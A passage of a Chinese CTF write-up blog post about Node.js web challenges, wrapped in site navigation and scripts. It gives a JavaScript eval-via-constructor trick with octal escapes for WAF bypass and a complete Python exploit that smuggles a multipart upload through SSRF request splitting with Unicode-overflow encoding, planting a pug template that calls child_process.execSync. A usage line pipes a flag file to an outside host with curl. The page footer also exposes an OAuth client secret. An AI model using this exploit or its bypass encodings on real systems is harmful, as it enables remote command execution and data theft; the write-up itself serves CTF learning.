+<p>赛后看了一下主办方的wp，发现js这里编码很简单。自己搞的有点复杂了。字符太多了。学到了一个新姿势</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 如下语法，可以当做eval使用。 </span></span><br><span class="line">[].<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;evalcode&quot;</span></span>)(<span class="params"></span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// js中.和[]可以替换</span></span><br><span class="line">[][<span class="string">&quot;constructor&quot;</span>][<span class="string">&quot;constructor&quot;</span>](<span class="string">&quot;evalcode&quot;</span>)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在js中，字符串中，可以采用 \八进制数值</span></span><br><span class="line">[][<span class="string">&quot;\143\157\156\163\164\162\165\143\164\157\162&quot;</span>][<span class="string">&quot;\143\157\156\163\164\162\165\143\164\157\162&quot;</span>](<span class="string">&quot;evalcode&quot;</span>)()</span><br></pre></td></tr></table></figure>
+
+<p>所以我们可以通过以上编码来进行绕过。此时因为引号在waf中，但这个waf我们可以直接二次url编码绕过。</p>
+<p>再有，通过wp得知，pug模板不止<code>#&#123;&#125;</code>一种方式，还可以直接<code>- code</code>。</p>
+<p>至此，本题所有知识点都已经介绍完。学到了很多新姿势。</p>
+<p><img src="http://img.5am3.com/5am3/img/20200210123701.png"></p>
+<h2 id="自己出的-node-game"><a href="#自己出的-node-game" class="headerlink" title="自己出的 - node game"></a>自己出的 - node game</h2><p>最近恰逢永信举办公益赛，出题没有太好的思路，恰好这两天比赛学到了点好玩的。</p>
+<p>在比赛时，看到可以通过ssrf构造header头，便开始想了，可不可以构造上传呢？</p>
+<p>当然是可以的，于是便有了这道题目。</p>
+<p>在这道题目中，遇到了一个小问题，就是构造好payload后，无法正常使用。node端一直报无法获取参数、此时就很迷。<br>最后解决方式，是通过wireshark抓取loopback数据包，可以看到以下情况。</p>
+<p><img src="http://img.5am3.com/5am3/img/20200211224328.png"></p>
+<p>我们可以发现有些字符依旧是url编码。我们需要将它再重编码一下。<br>最后可得正确payload。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">payloadRaw = <span class="string">&quot;&quot;&quot;x HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:8081</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942</span></span><br><span class="line"><span class="string">Content-Length: 6279</span></span><br><span class="line"><span class="string">Origin: http://localhost:8081</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Referer: http://localhost:8081/?action=upload</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------12837266501973088788260782942</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;5am3_get_flag.pug&quot;</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;evalcmd&#x27;)</span></span><br><span class="line"><span class="string">-----------------------------12837266501973088788260782942--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getParm</span>(<span class="params">payload</span>):</span><br><span class="line">    payload = payload.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;%C4%A0&quot;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;%C4%8D%C4%8A&quot;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;%C4%A2&quot;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;%C4%A7&quot;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&quot;`&quot;</span>,<span class="string">&quot;%C5%A0&quot;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&quot;!&quot;</span>,<span class="string">&quot;%C4%A1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = payload.replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;%2B&quot;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&quot;;&quot;</span>,<span class="string">&quot;%3B&quot;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;%26&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Bypass Waf </span></span><br><span class="line">    payload = payload.replace(<span class="string">&quot;global&quot;</span>,<span class="string">&quot;%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC&quot;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&quot;process&quot;</span>,<span class="string">&quot;%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3&quot;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&quot;mainModule&quot;</span>,<span class="string">&quot;%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5&quot;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&quot;require&quot;</span>,<span class="string">&quot;%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5&quot;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&quot;root&quot;</span>,<span class="string">&quot;%C5%B2%C5%AF%C5%AF%C5%B4&quot;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&quot;child_process&quot;</span>,<span class="string">&quot;%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5%9F%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3&quot;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;%C5%A5%C5%B8%C5%A5%C5%A3&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">url,cmd</span>):</span><br><span class="line">    payloadC =  payloadRaw.replace(<span class="string">&quot;evalcmd&quot;</span>,cmd)</span><br><span class="line">    urlC = url+<span class="string">&quot;/core?q=&quot;</span>+getParm(payloadC)</span><br><span class="line">    requests.get(urlC)</span><br><span class="line">    </span><br><span class="line">    requests.get(url+<span class="string">&quot;/?action=5am3_get_flag&quot;</span>).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    targetUrl = sys.argv[<span class="number">1</span>]</span><br><span class="line">    cmd = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="built_in">print</span> run(targetUrl,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># python exp.py http://127.0.0.1:8081 &quot;curl eval.com -X POST -d `cat /flag.txt`&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/2020/02/11/ctf-node1/">近两次比赛遇到的node题目简析</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问  的个人博客"></a></p>
+        <p><span>发布时间:</span>2020年02月11日 - 22时26分</p>
+        <p><span>最后更新:</span>2024年12月05日 - 02时39分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2020/02/11/ctf-node1/" title="近两次比赛遇到的node题目简析">https://blog.5am3.com/2020/02/11/ctf-node1/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://blog.5am3.com/2020/02/11/ctf-node1/　　作者: " title=""></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a  href="/2019/04/19/ddctf2019/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">2019DDCTF  writeup</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HackTM-CTF-2020-Draw-with-us"><span class="toc-number">1.</span> <span class="toc-text">HackTM CTF 2020 - Draw with us</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nullcon-HackIM-2020-split-second"><span class="toc-number">2.</span> <span class="toc-text">nullcon HackIM 2020 - split second</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game"><span class="toc-number">3.</span> <span class="toc-text">自己出的 - node game</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='https://static.5am3.com/js/baidu/share.js?v=111.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <div id="gitments" style="width: 90%; margin: 0 auto;"></div>
+<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+
+<script>
+    var gitment = new Gitment({
+      id: window.location.pathname,
+      owner: '5am3',
+      repo: '5am3.github.io',
+      oauth: {
+        client_id: 'f9b6a0a70c093d4f4f91',
+        client_secret: 'ddda0abc39ed79ab681585813d74b83e5e00256a',
+      },
+    })
+    gitment.render('gitments')
+</script> 
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a  href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/2019/04/19/ddctf2019/" title="下一篇: 2019DDCTF  writeup">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/02/11/ctf-node1/">近两次比赛遇到的node题目简析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/19/ddctf2019/">2019DDCTF  writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/12/2018HCTF-share/">2018HCTF-share</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/23/MysqlOnline-writeup/">MysqlOnline writeup 巅峰极客</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/04/GourdScan_V2/">GourdScan V2 配置安全及使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/03/0ctf-final/">2018 0CTF final h4x0rs.date</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/04/web-testing-one/">记一次简单的渗透测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/24/ddctf2018/">2018DDCTF  writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/26/qwb-xss-rpo/">强网杯-Share your mind</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/25/anheng-2-xss/">2018安恒杯二月赛-web-应该不是 XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/08/SCodeCTF/">通过docker部署ctf题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/20/2017LCTF-1/">2017LCTF wanna hack him? writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/09/360-interview/">360面试经历及心得</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/31/miac2-writeup/">2017-miac2-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/02/xman-2/">【诺熙】XMAN训练营手记-2-密码</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/01/xman-1/">XMAN训练营手记-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/17/hexo2/">2.初识HEXO-页面配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/17/hexo1/">1.初识HEXO-文档排版</a></li></ul>
+    
+    <script src="https://cdn.bootcdn.net/ajax/libs/require.js/2.1.6/require.min.js"></script>
+    <script src="https://cdn.bootcdn.net/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2024 丶诺熙
+            </div>
+            <div class="footer-right">
+                <p>Power By <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/maochunguang/black-blue" target="_blank">Themme by tommy</a></p>
+            </div>
+        </div>
+        
+            <div class="visit">
+                <script src="https://s22.cnzz.com/z_stat.php?id=1267947142&web_id=1267947142" language="JavaScript"></script>
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >极客到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+
+    </div>
+    
+<script src="/js/main.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 4;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'xxxxx', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
